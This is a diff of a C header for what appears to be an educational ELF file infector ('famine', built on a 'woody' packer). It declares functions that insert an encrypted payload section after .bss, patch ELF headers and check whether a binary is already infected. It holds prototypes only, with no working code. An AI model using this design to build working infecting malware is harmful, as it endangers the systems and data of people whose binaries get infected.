@@ -76,9 +76,7 @@ typedef struct	s_famine {
 
 void	woody_mod_c(char *target);
 
-void	exit_clean(struct s_woody *woody, int exit_status);
-
-void	check_headers_offset(struct s_woody *woody);
+bool	check_headers_offset(struct s_woody *woody);
 
 const char	*get_phdr_type_str(uint32_t p_type);
 const char	*get_phdr_flags_str(uint32_t flags, char buff[4]);
@@ -88,7 +86,7 @@ void		get_shstrtab(struct s_woody *woody);
 uint16_t	get_index_segment_containing_section(struct s_woody *woody, Elf64_Shdr *section);
 uint16_t	get_index_section_with_name(struct s_woody *woody, char *section_name);
 
-void	read_elf_header(struct s_woody *woody);
+bool	read_elf_header(struct s_woody *woody);
 void	read_program_header(struct s_woody *woody, uint16_t index, Elf64_Phdr *phdr);
 void	read_section_header(struct s_woody *woody, uint16_t index, Elf64_Shdr *shdr);
 
@@ -98,15 +96,15 @@ void	write_uint64(struct s_woody *woody, uint64_t *addr, uint64_t value);
 
 void	modify_ehdr(struct s_woody *woody);
 void	modify_phdr_bss(struct s_woody *woody, Elf64_Phdr *phdr_bss, uint16_t index_phdr_bss);
-void	modify_phdr_text(struct s_woody *woody, Elf64_Shdr *shdr_text);
+bool	modify_phdr_text(struct s_woody *woody, Elf64_Shdr *shdr_text);
 void	modify_shdr_pushed_by_new_section(struct s_woody *woody, uint16_t index_shdr_last);
 void	modify_shdr_last(struct s_woody *woody, Elf64_Shdr *shdr_last, uint16_t index_shdr_last);
 
-void	insert_section_after_bss(struct s_woody *woody);
+bool	insert_section_after_bss(struct s_woody *woody);
 
-void	save_new_section(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *shdr_bss);
-void	save_new_shdr(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *new_section);
-void	save_new_elf_file(struct s_woody *woody, Elf64_Shdr *shdr_bss, uint16_t index_shdr_bss);
+bool	save_new_section(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *shdr_bss);
+bool	save_new_shdr(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *new_section);
+bool	save_new_elf_file(struct s_woody *woody, Elf64_Shdr *shdr_bss, uint16_t index_shdr_bss);
 
 // DEBUG
 void	debug_print_headers(struct s_woody *woody);
@@ -117,6 +115,7 @@ void	debug_print_section_header(struct s_woody *woody);
 void	_start();
 void	woody_mod();
 void	xor_cipher(char *key, size_t key_size, void *text, size_t text_size);
+void	key_loc();
 long	syscall_wrapper(long number, ...);
 
 // famine func
@@ -124,6 +123,6 @@ bool	check_binary_infected(struct s_woody *woody, Elf64_Shdr *shdr_last);
 
 
 # define BYTECODE_UNPACKER_SIZE ((size_t)syscall_wrapper - (size_t)woody_mod + 1)
-# define BYTECODE_SIZE ((size_t)syscall_wrapper - (size_t)woody_mod + 1)
+# define BYTECODE_SIZE ((size_t)_start - (size_t)woody_mod + 1)
 
 #endif
